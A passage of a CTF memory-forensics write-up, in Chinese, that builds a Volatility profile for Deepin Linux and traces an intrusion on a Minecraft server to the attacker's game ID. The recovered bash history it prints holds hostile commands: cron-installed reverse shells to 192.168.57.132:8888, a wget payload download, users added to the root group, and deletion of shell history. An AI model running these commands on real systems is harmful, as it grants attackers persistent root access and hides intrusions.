Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-data-am&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_attr&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_attr&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/bin/attr_form<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/attr_form&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/attr_form&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-data-am&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/attr_form&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/attr_form&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/bin/buildopstab<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/buildopstab&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/buildopstab&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-data-am&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/buildopstab&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/buildopstab&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/bin/builduritable<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/builduritable&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/builduritable&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-data-am&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/builduritable&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/builduritable&#x27;</span><br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br> /bin/mkdir -p <span class="hljs-string">&#x27;/usr/local/lib/pkgconfig&#x27;</span><br> /usr/bin/install -c -m 644 libdwarf.pc <span class="hljs-string">&#x27;/usr/local/lib/pkgconfig&#x27;</span><br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br><br>root@test-PC:~/libdwarf-0.6.0/build# dwarfdump -V<br>dwarfdump [Dec  8 2025 20:09:30 (libdwarf 0.6.0 dwarfdump 0.6.0)]<br>root@test-PC:~/libdwarf-0.6.0/build# <br></code></pre></td></tr></table></figure>
+
+<p>将volatility2\tools\linux拷贝到安装的Deepin15.5中制作dwarf文件</p>
+<h4 id="制作Profile并打包"><a href="#制作Profile并打包" class="headerlink" title="制作Profile并打包"></a>制作Profile并打包</h4><p>进入拷贝的linux文件夹编译module.dwarf文件，打包为zip复制到\volatility2\volatility\plugins\overlays\linux下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@test-PC:~# <span class="hljs-built_in">cd</span> linux/<br>root@test-PC:~/linux# <span class="hljs-built_in">ls</span><br>kcore  Makefile  Makefile.enterprise  module.c<br>root@test-PC:~/linux# make<br>make -C //lib/modules/4.9.0-deepin13-amd64/build CONFIG_DEBUG_INFO=y M=<span class="hljs-string">&quot;/root/linux&quot;</span> modules<br>make[1]: Entering directory <span class="hljs-string">&#x27;/usr/src/linux-headers-4.9.0-deepin13-amd64&#x27;</span><br>  CC [M]  /root/linux/module.o<br>  Building modules, stage 2.<br>  MODPOST 1 modules<br>  CC      /root/linux/module.mod.o<br>  LD [M]  /root/linux/module.ko<br>make[1]: Leaving directory <span class="hljs-string">&#x27;/usr/src/linux-headers-4.9.0-deepin13-amd64&#x27;</span><br>dwarfdump -di module.ko &gt; module.dwarf<br>make -C //lib/modules/4.9.0-deepin13-amd64/build M=<span class="hljs-string">&quot;/root/linux&quot;</span> clean<br>make[1]: Entering directory <span class="hljs-string">&#x27;/usr/src/linux-headers-4.9.0-deepin13-amd64&#x27;</span><br>  CLEAN   /root/linux/.tmp_versions<br>  CLEAN   /root/linux/Module.symvers<br>make[1]: Leaving directory <span class="hljs-string">&#x27;/usr/src/linux-headers-4.9.0-deepin13-amd64&#x27;</span><br>root@test-PC:~/linux# <span class="hljs-built_in">ls</span><br>kcore  Makefile  Makefile.enterprise  module.c	module.dwarf<br>root@test-PC:~/linux# <span class="hljs-built_in">cp</span> /boot/System.map-4.9.0-deepin13-amd64 .<br>root@test-PC:~/linux# zip `<span class="hljs-built_in">uname</span> -r`.zip System.map-4.9.0-deepin13-amd64 module.dwarf <br>  adding: System.map-4.9.0-deepin13-amd64 (deflated 79%)<br>  adding: module.dwarf (deflated 91%)<br>root@test-PC:~/linux# <br></code></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208202652978.png" srcset="/img/loading.gif" lazyload alt="image-20251208202652978"></p>
+<p>然后使用–info命令查看是否存在新添加的profile</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python2 vol.py <span class="hljs-literal">--info</span><br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span>.<span class="hljs-number">1</span><br><br><br>Profiles<br><span class="hljs-literal">--------</span><br>Linux4_9_0<span class="hljs-literal">-deepin13-amd64x64</span>        - A Profile <span class="hljs-keyword">for</span> Linux <span class="hljs-number">4.9</span>.<span class="hljs-number">0</span><span class="hljs-literal">-deepin13-amd64</span> x64<br>Linuxubuntu<span class="hljs-literal">-5_4_0-205-generic-lnx64</span> - A Profile <span class="hljs-keyword">for</span> Linux ubuntu<span class="hljs-literal">-5</span>.<span class="hljs-number">4.0</span><span class="hljs-literal">-205-generic-ln</span> x64<br>Linuxubuntu<span class="hljs-literal">-5_4_0-205-genericx64</span>    - A Profile <span class="hljs-keyword">for</span> Linux ubuntu<span class="hljs-literal">-5</span>.<span class="hljs-number">4.0</span><span class="hljs-literal">-205-generic</span> x64<br>VistaSP0x64                         - A Profile <span class="hljs-keyword">for</span> Windows Vista SP0 x64<br></code></pre></td></tr></table></figure>
+
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>使用linux_recover_filesystem从内存中恢复整个缓存的文件系统，或使用linux_find_file列出并从内存中恢复文件</p>
+<p>linux_recover_filesystem如果是使用Windows会出现问题，因为Windows无法os.chown，可以对代码进行修改使其能正常恢复</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python2 <span class="hljs-built_in">vol</span>.py -f mem.mem --profile=Linux4_9_0-deepin13-amd64x64 linux_recover_filesystem --dump-<span class="hljs-built_in">dir</span>=&quot;.\output&quot;<br><br>........<br><br>Recovered <span class="hljs-number">38580</span> files<br></code></pre></td></tr></table></figure>
+
+<h4 id="蛤客zym在Minecraft游戏中的id是什么"><a href="#蛤客zym在Minecraft游戏中的id是什么" class="headerlink" title="蛤客zym在Minecraft游戏中的id是什么?"></a>蛤客zym在Minecraft游戏中的id是什么?</h4><p>本题解法不唯一</p>
+<p>恢复操作系统文件后，在根目录能发现一个purpur-1.20.4文件夹，判断为Minecraft服务器文件夹</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208203350749.png" srcset="/img/loading.gif" lazyload alt="image-20251208203350749"></p>
+<p>可以通过其中的日志文件，插件存储的日志数据，系统中执行的命令等分析出蛤客zym在Minecraft游戏中的id，实在不行直接看usercache.json或者coreprotect的数据库，里面就7-8个用户一个个试就行</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208203423726.png" srcset="/img/loading.gif" lazyload alt="image-20251208203423726"></p>
+<p>在Chatty插件的目录中，查看2025-05-12.log，可以发现是聊天信息，可以看到最后一行，名为W4ngXunFish的用户执行了一条命令，找到位于&#x2F;purpur-1.20.4中的shell这个文件发现是一个反弹shell的代码</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208203813636.png" srcset="/img/loading.gif" lazyload alt="image-20251208203813636"></p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208204155973.png" srcset="/img/loading.gif" lazyload alt="image-20251208204155973"></p>
+<p>user-cache.json:</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208211710082.png" srcset="/img/loading.gif" lazyload alt="image-20251208211710082"></p>
+<p>CoreProtect:</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208211617365.png" srcset="/img/loading.gif" lazyload alt="image-20251208211617365"></p>
+<p>使用linux_bash恢复bash历史记录分析执行的命令，发现创建了wangxunyu用户，结合上面的用户名也可以推断入侵的蛤客zym的游戏ID为W4ngXunF1sh</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs powershell">python2 vol.py <span class="hljs-operator">-f</span> mem.mem <span class="hljs-literal">--profile</span>=Linux4_9_0<span class="hljs-literal">-deepin13-amd64x64</span> linux_bash<br>Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span>.<span class="hljs-number">1</span><br>Pid      Name                 Command Time                   Command<br><span class="hljs-literal">--------</span> <span class="hljs-literal">--------------------</span> <span class="hljs-literal">------------------------------</span> <span class="hljs-literal">-------</span><br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /purpur-1.20.4/shell&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> /<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   adduser WangXunYu<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">rm</span> <span class="hljs-literal">-rf</span> ~/.bash_history<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cat</span> /etc/crontab<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   systemctl restart mcsm<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.57.132/8888 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">30</span> UTC+<span class="hljs-number">0000</span>   nohup python3 <span class="hljs-literal">-m</span> http.server <span class="hljs-number">80</span> &amp;<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">49</span>:<span class="hljs-number">45</span> UTC+<span class="hljs-number">0000</span>   adduser wangxunyu<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">08</span> UTC+<span class="hljs-number">0000</span>   useradd wangxunyu <span class="hljs-literal">-G</span> root<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">19</span> UTC+<span class="hljs-number">0000</span>   useradd wangxunyu2 <span class="hljs-literal">-G</span> root<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">26</span> UTC+<span class="hljs-number">0000</span>   passwd wangxunyu2<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">11</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> /<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">22</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">kill</span> <span class="hljs-literal">-9</span> <span class="hljs-number">49365</span><br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">32</span> UTC+<span class="hljs-number">0000</span>   nohup python3 <span class="hljs-literal">-m</span> http.server <span class="hljs-number">80</span> &amp;<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">52</span>:<span class="hljs-number">33</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> /home/n0<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">52</span>:<span class="hljs-number">35</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">ls</span><br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">52</span>:<span class="hljs-number">51</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> Downloads<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">04</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">rm</span> <span class="hljs-literal">-rf</span> wXm<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">08</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">ls</span><br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">14</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cp</span> ??????P@s5 /tmp<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">23</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cp</span> ??????P@s5 /<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">wget</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">57.132</span>/wXm<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">48</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cp</span> wXm /tmp<br>   <span class="hljs-number">49004</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">53</span>:<span class="hljs-number">56</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cp</span> wXm ../Desktop<br>   <span class="hljs-number">49441</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /purpur-1.20.4/shell&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">49441</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> /<br>   <span class="hljs-number">49441</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   adduser WangXunYu<br>   <span class="hljs-number">49441</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">rm</span> <span class="hljs-literal">-rf</span> ~/.bash_history<br>   <span class="hljs-number">49441</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cat</span> /etc/crontab<br>   <span class="hljs-number">49441</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   systemctl restart mcsm<br>   <span class="hljs-number">49441</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">50</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.57.132/8888 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">50096</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /purpur-1.20.4/shell&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">50096</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> /<br>   <span class="hljs-number">50096</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   adduser WangXunYu<br>   <span class="hljs-number">50096</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">rm</span> <span class="hljs-literal">-rf</span> ~/.bash_history<br>   <span class="hljs-number">50096</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cat</span> /etc/crontab<br>   <span class="hljs-number">50096</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   systemctl restart mcsm<br>   <span class="hljs-number">50096</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">01</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.57.132/8888 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">52805</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">54</span>:<span class="hljs-number">59</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">rm</span> <span class="hljs-literal">-rf</span> ~/.bash_<br>   <span class="hljs-number">52805</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">54</span>:<span class="hljs-number">59</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">rm</span> <span class="hljs-literal">-rf</span> ~/.bash_history<br>   <span class="hljs-number">52805</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">56</span>:<span class="hljs-number">52</span> UTC+<span class="hljs-number">0000</span>   sudo su<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">00</span> UTC+<span class="hljs-number">0000</span>   systemctl restart mcsm<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">00</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">rm</span> <span class="hljs-literal">-rf</span> ~/.bash_history<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">00</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> /<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">00</span> UTC+<span class="hljs-number">0000</span>   adduser WangXunYu<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">00</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cat</span> /etc/crontab<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">00</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /purpur-1.20.4/shell&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">00</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*/1 * * * * root /bin/bash -i &gt;&amp; /dev/tcp/192.168.57.132/8888 0&gt;&amp;1&quot;</span> &gt;&gt; /etc/crontab<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">08</span> UTC+<span class="hljs-number">0000</span>    vmhgfs .host:/ /mnt/hgfs/<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">14</span> UTC+<span class="hljs-number">0000</span>    vmhgfs<span class="hljs-literal">-fuse</span> .host:/ /mnt/hgfs/<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">23</span> UTC+<span class="hljs-number">0000</span>   <span class="hljs-built_in">cd</span> /usr/local/src/LiME<span class="hljs-literal">-1</span>.<span class="hljs-number">9.1</span>/src<br>   <span class="hljs-number">54193</span> bash                 <span class="hljs-number">2025</span><span class="hljs-literal">-05-11</span> <span class="hljs-number">19</span>:<span class="hljs-number">57</span>:<span class="hljs-number">53</span> UTC+<span class="hljs-number">0000</span>   insmod ./lime<span class="hljs-literal">-4</span>.<span class="hljs-number">9.0</span><span class="hljs-literal">-deepin13-amd64</span>.ko <span class="hljs-string">&quot;path=/mnt/hgfs/share/mem.mem format=lime&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Q1 Answer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">W4ngXunF1sh</span><br></code></pre></td></tr></table></figure>
+
